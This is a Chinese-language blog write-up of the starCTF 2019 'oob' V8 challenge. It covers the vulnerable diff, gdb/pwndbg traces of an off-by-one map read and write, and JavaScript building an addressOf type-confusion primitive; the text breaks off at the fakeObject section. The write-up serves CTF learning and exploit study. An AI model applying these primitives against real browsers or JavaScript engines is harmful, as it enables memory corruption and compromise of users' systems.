<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="fa1lr4in">
    
    <title>
        
            starctf2019-oob |
        
        fa1lr4in&#39;s blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/logo.svg">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/css/font-awesome.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"fa1lr4in.github.io","root":"/","language":"en","path":"search.json"};
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.svg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"男儿何不带吴钩，收取关山五十州。"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
  </script>
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
</head>


<body>
<div class="progress-bar-container">
    

    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            <header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                fa1lr4in&#39;s blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                HOME
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                ARCHIVES
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                CATEGORIES
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                TAGS
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                ABOUT
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">HOME</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">ARCHIVES</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">CATEGORIES</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">TAGS</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">ABOUT</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="article-content-container">

        <div class="article-title">
            <span class="title-hover-animation">starctf2019-oob</span>
        </div>

        
            <div class="article-header">
                <div class="avatar">
                    <img src="/images/avatar.svg">
                </div>
                <div class="info">
                    <div class="author">
                        <span class="name">fa1lr4in</span>
                        
                            <span class="author-label">Lv2</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fas fa-edit"></i>&nbsp;
        <span class="pc">2021-04-21 19:37:19</span>
        <span class="mobile">2021-04-21 19:37</span>
    </span>
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/">浏览器</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>6.8k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>33 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        <div class="article-content markdown-body">
            <h1 id="starctf2019-oob"><a href="#starctf2019-oob" class="headerlink" title="starctf2019-oob"></a>starctf2019-oob</h1><h2 id="1、环境复现"><a href="#1、环境复现" class="headerlink" title="1、环境复现"></a>1、环境复现</h2><p>1、搭建v8调试环境，并下载题目到指定目录（这里需要有v8调试环境搭建的基础，要做好git全局代理和bash全局代理的准备）</p>
<p>2、还原题目环境</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> v8</span><br><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598				<span class="comment">#设置v8分支</span></span><br><span class="line">gclient sync</span><br><span class="line">git apply ../oob.diff</span><br><span class="line">tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure>

<h2 id="2、diff分析"><a href="#2、diff分析" class="headerlink" title="2、diff分析"></a>2、diff分析</h2><p>diff文件如下，其中主要的逻辑在于kArrayOob的具体实现部分，我直接在该段代码中将重要位置进行注释</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644</span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"> </span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();													</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();					    //指定参数个数大于1的时候返回	   </span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);						   //将receiver对象强转成array对象</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());				//elements为array对象的elements字段</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());				//数组长度</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));			//当参数为空，返回第length个元素的内容</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;														</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());										 //当参数为个数为1，就将第一个参数写入到数组中的第length个元素的值</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0447230..f113a81 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -368,6 +368,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index ed1e4a5..c199e3a 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>由于创建一个数组长度为length时我们可以访问的是第0到length-1个元素，但是该段代码却直接读取和写入第length个元素，这样就造成了off-by-one。</p>
<p>验证一下，实际上也和我们的分析是一样的</p>
<p><img src="/2021/04/21/starctf2019-oob/image-20201230164453695.png" alt="image-20201230164453695"></p>
<h2 id="3、分析利用思路"><a href="#3、分析利用思路" class="headerlink" title="3、分析利用思路"></a>3、分析利用思路</h2><p>首先编写test.js如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>, <span class="number">1.1</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="keyword">var</span> data = a.oob();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] oob return data:&quot;</span> + data.toString());</span><br><span class="line">%SystemBreak();</span><br><span class="line">a.oob(<span class="number">2</span>);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>

<p>调试到第一步会给出数组a的object的基址，查看相关job，telescope</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">gdb d8</span><br><span class="line">set args --allow-natives-syntax test_jscode/test.js</span><br><span class="line">r</span><br><span class="line">pwndbg&gt; job <span class="number">0x0f264d68de49</span></span><br><span class="line"><span class="number">0xf264d68de49</span>: [JSArray]</span><br><span class="line"> - map: <span class="number">0x3e88cd582ed9</span> &lt;<span class="built_in">Map</span>(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x1cf103951111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - elements: <span class="number">0x0f264d68de19</span> &lt;FixedDoubleArray[<span class="number">4</span>]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: <span class="number">4</span></span><br><span class="line"> - properties: <span class="number">0x0f553c540c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    <span class="meta">#length: 0x01ac3ca801a9 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x0f264d68de19</span> &lt;FixedDoubleArray[<span class="number">4</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">2</span></span><br><span class="line">           <span class="number">2</span>: <span class="number">3</span></span><br><span class="line">           <span class="number">3</span>: <span class="number">1.1</span></span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x0f264d68de48</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0xf264d68de48</span> —▸ <span class="number">0x3e88cd582ed9</span> ◂— <span class="number">0x400000f553c5401</span>				 <span class="comment">//map, 注意到这个时候0xf264d68de48位置的值是0x3e88cd582ed9</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0xf264d68de50</span> —▸ <span class="number">0xf553c540c71</span> ◂— <span class="number">0xf553c5408</span>					<span class="comment">//protype</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0xf264d68de58</span> —▸ <span class="number">0xf264d68de19</span> ◂— <span class="number">0xf553c5414</span>					<span class="comment">//elements, 在该object-0x30的位置上</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0xf264d68de60</span> ◂— <span class="number">0x400000000</span>									   <span class="comment">//length</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0xf264d68de68</span> ◂— <span class="number">0x0</span>											  <span class="comment">//properties</span></span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; job <span class="number">0x0f264d68de19</span></span><br><span class="line"><span class="number">0xf264d68de19</span>: [FixedDoubleArray]</span><br><span class="line"> - map: <span class="number">0x0f553c5414f9</span> &lt;Map&gt;</span><br><span class="line"> - length: <span class="number">4</span></span><br><span class="line">           <span class="number">0</span>: <span class="number">1</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">2</span></span><br><span class="line">           <span class="number">2</span>: <span class="number">3</span></span><br><span class="line">           <span class="number">3</span>: <span class="number">1.1</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x0f264d68de18</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0xf264d68de18</span> —▸ <span class="number">0xf553c5414f9</span> ◂— <span class="number">0xf553c5401</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0xf264d68de20</span> ◂— <span class="number">0x400000000</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0xf264d68de28</span> ◂— <span class="number">0x3ff0000000000000</span>								<span class="comment">//1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0xf264d68de30</span> ◂— <span class="number">0x4000000000000000</span>								<span class="comment">//2</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0xf264d68de38</span> ◂— <span class="number">0x4008000000000000</span>								<span class="comment">//3</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│   <span class="number">0xf264d68de40</span> ◂— <span class="number">0x3ff199999999999a</span>								<span class="comment">//1.1			</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│   <span class="number">0xf264d68de48</span> —▸ <span class="number">0x3e88cd582ed9</span> ◂— <span class="number">0x400000f553c5401</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│   <span class="number">0xf264d68de50</span> —▸ <span class="number">0xf553c540c71</span> ◂— <span class="number">0xf553c5408</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>调试到第二步，打印到了0xf264d68de48位置处的值</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">[*] oob <span class="keyword">return</span> data:<span class="number">3.3970610731499e-310</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>调试到第三步，对0xf264d68de48进行了写入</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x0f264d68de18</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0xf264d68de18</span> —▸ <span class="number">0xf553c5414f9</span> ◂— <span class="number">0xf553c5401</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0xf264d68de20</span> ◂— <span class="number">0x400000000</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0xf264d68de28</span> ◂— <span class="number">0x3ff0000000000000</span>							<span class="comment">//1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0xf264d68de30</span> ◂— <span class="number">0x4000000000000000</span>							<span class="comment">//2</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0xf264d68de38</span> ◂— <span class="number">0x4008000000000000</span>							<span class="comment">//3</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│   <span class="number">0xf264d68de40</span> ◂— <span class="number">0x3ff199999999999a</span>							<span class="comment">//1.1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│   <span class="number">0xf264d68de48</span> ◂— <span class="number">0x4000000000000000</span>							<span class="comment">//2</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│   <span class="number">0xf264d68de50</span> —▸ <span class="number">0xf553c540c71</span> ◂— <span class="number">0xf553c5408</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x0f264d68de48</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0xf264d68de48</span> ◂— <span class="number">0x4000000000000000</span>							<span class="comment">//2，本来是object的map值，已经被覆盖修改成浮点数的2</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0xf264d68de50</span> —▸ <span class="number">0xf553c540c71</span> ◂— <span class="number">0xf553c5408</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0xf264d68de58</span> —▸ <span class="number">0xf264d68de19</span> ◂— <span class="number">0xf553c5414</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0xf264d68de60</span> ◂— <span class="number">0x400000000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0xf264d68de68</span> —▸ <span class="number">0xf553c540561</span> ◂— <span class="number">0x200000f553c5401</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│   <span class="number">0xf264d68de70</span> —▸ <span class="number">0x3e88cd582ed9</span> ◂— <span class="number">0x400000f553c5401</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│   <span class="number">0xf264d68de78</span> —▸ <span class="number">0xf553c541ea9</span> ◂— <span class="number">0x400000f553c5401</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│   <span class="number">0xf264d68de80</span> ◂— <span class="number">0x2800000003</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x0f264d68de19</span></span><br><span class="line"><span class="number">0xf264d68de19</span>: [FixedDoubleArray]</span><br><span class="line"> - map: <span class="number">0x0f553c5414f9</span> &lt;Map&gt;</span><br><span class="line"> - length: <span class="number">4</span></span><br><span class="line">           <span class="number">0</span>: <span class="number">1</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">2</span></span><br><span class="line">           <span class="number">2</span>: <span class="number">3</span></span><br><span class="line">           <span class="number">3</span>: <span class="number">1.1</span></span><br></pre></td></tr></table></figure>

<p>总结一下，当我们不传参数时，可以泄露object的map字段的值，如果传入参数，传入的参数会写入进object的map字段。</p>
<h2 id="4、编写addressOf和fakeObject原语"><a href="#4、编写addressOf和fakeObject原语" class="headerlink" title="4、编写addressOf和fakeObject原语"></a>4、编写addressOf和fakeObject原语</h2><h3 id="what"><a href="#what" class="headerlink" title="what"></a>what</h3><p>什么叫做addressOf和fakeObject</p>
<blockquote>
<p><strong>计算一个对象的地址addressOf</strong>：将需要计算内存地址的对象存放到一个对象数组中的A[0]，然后利用上述类型混淆漏洞，将对象数组的Map类型修改为浮点数数组的类型，访问A[0]即可得到浮点数表示的目标对象的内存地址。</p>
<p><strong>将一个内存地址伪造为一个对象fakeObject</strong>：将需要伪造的内存地址存放到一个浮点数数组中的B[0]，然后利用上述类型混淆漏洞，将浮点数数组的Map类型修改为对象数组的类型，那么B[0]此时就代表了以这个内存地址为起始地址的一个JS对象了。</p>
</blockquote>
<p>说白了就是一个可以将对象当作地址，一个可以将地址当作对象。我们拿到这个有什么用呢？</p>
<h3 id="why"><a href="#why" class="headerlink" title="why"></a>why</h3><p>如果我们定义一个FloatArray浮点数数组A，然后定义一个对象数组B。正常情况下，访问A[0]返回的是一个浮点数，访问B[0]返回的是一个对象元素。如果将B的类型修改为A的类型，那么再次访问B[0]时，返回的就不是对象元素B[0]，而是B[0]对象元素转换为浮点数即B[0]对象的内存地址了；如果将A的类型修改为B的类型，那么再次访问A[0]时，返回的就不是浮点数A[0]，而是以A[0]为内存地址的一个JavaScript对象了。</p>
<p>造成上面的原因在于，v8完全依赖Map类型对js对象进行解析。上面这个逻辑希望能仔细理解一下。</p>
<p>通过上面两种类型混淆的方式，就能够实现addressOf和fakeObject。</p>
<p>基于上述分析，如果我们利用oob的读取功能将数组对象A的对象类型Map读取出来，然后利用oob的写入功能将这个类型写入数组对象B，就会导致数组对象B的类型变为了数组对象A的对象类型，这样就造成了类型混淆。</p>
<h3 id="how"><a href="#how" class="headerlink" title="how"></a>how</h3><p>下面我们利用JavaScript实现上述addressOf和fakeObject功能原语。</p>
<p>首先定义两个全局的Float数组和对象数组，利用oob函数漏洞泄露两个数组的Map类型：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br></pre></td></tr></table></figure>

<p>然后实现下面两个函数，下面两个函数就是+1或-1和换map头的过程</p>
<p><strong>addressOf 泄露某个object的地址</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 泄露某个object的地址</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;							<span class="comment">//将要泄露的对象放到对象数组上</span></span><br><span class="line">    obj_array.oob(float_array_map);						<span class="comment">//将对象数组的头替换为float数组的头</span></span><br><span class="line">    <span class="keyword">let</span> obj_addr = f2i(obj_array[<span class="number">0</span>]) - <span class="number">1n</span>;			     <span class="comment">//将对象数组的元素的地址泄露。let类型的变量与var类型的变量相比，限定了作用域，let是在块级作用域有效，而var是全局的变量；-1n其实就是-1，因为1是代表对象的标志，-1就是将对象转变为了地址</span></span><br><span class="line">    obj_array.oob(obj_array_map); 						<span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> obj_addr;								   <span class="comment">//返回的是个float</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>fakeObject 将某个addr强制转换为object的对象</strong></p>
